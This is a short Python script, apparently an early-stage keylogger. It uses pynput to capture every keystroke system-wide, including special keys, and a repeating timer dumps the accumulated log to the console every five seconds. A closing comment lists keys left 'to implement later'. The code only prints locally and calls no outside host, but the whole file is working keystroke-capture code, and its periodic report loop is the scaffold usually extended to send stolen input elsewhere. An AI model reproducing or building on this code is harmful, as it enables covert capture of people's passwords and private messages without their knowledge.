import pynput.keyboard as keyboard
import threading

log = ""

def callingBack(key):
 global log 
 try:
  log = log + str(key.char)
 except AttributeError:
  if key == key.space:
   log = log + " "
  else:
   log = log + " " + str(key) + " "

def report():
 global log
 print(log)
 log = ""
 timer = threading.Timer(5, report)
 timer.start()

key_Listener = keyboard.Listener(on_press=callingBack)

with key_Listener:
 report()
 key_Listener.join()

#Later to implement
#Key.backspace  Key.space  Key.enter  Key.up  Key.down  Key.left  Key.right  Key.ctrl  Key.cmd  Key.alt NoneNone Key.shift  Key.caps_lock  Key.caps_lock  Key.tab  Key.ctrl 
